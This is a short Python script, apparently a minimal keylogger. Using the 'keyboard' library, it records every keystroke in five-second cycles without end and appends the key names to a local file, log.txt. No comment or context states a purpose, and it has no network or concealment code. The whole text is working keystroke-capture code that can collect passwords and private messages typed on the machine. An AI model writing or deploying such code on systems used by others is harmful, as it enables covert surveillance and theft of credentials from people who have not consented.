from keyboard import start_recording, stop_recording, KEY_DOWN, all_modifiers
from time import sleep

while True:
    start_recording()
    sleep(5)

    with open("log.txt", "a") as file:
        file.write("".join(f"{key.name} " for key in stop_recording() if key.event_type == KEY_DOWN and key.name not in all_modifiers))